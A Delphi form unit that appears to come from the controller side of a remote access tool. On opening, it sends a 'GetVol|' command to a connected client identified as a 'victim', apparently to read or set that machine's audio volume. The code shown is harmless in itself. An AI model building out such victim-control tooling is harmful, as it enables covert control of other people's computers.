unit FrmVol;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.ComCtrls;

type
  TForm13 = class(TForm)
    GroupBox1: TGroupBox;
    TrackBar1: TTrackBar;
    Label1: TLabel;
    GroupBox2: TGroupBox;
    Label2: TLabel;
    TrackBar2: TTrackBar;
    procedure FormCreate(Sender: TObject);
  private
    { Private declarations }
  public
    ThisFormsVictimID: string;
  end;

var
  Form13: TForm13;

implementation

{$R *.dfm}

uses FrmMain;

procedure SendToSelectedClient(const VictimID, Msg: string);
var
  I: Integer;
  NickName: string;
  UserData: TConnectedUserData;
begin
  NickName := VictimID;
  for I := 0 to Form1.ConnectedUsers.Count - 1 do
  begin
    UserData := TConnectedUserData(Form1.ConnectedUsers.Objects[I]);
    if UserData.ID = NickName then
    begin
      Form1.ServerSource.ExecCommand(UserData.Line, 0, BytesOf(Msg), False);
      Exit;
    end;
  end;
end;



procedure TForm13.FormCreate(Sender: TObject);
begin
 SendToSelectedClient(ThisFormsVictimID, 'GetVol|');
end;

end.
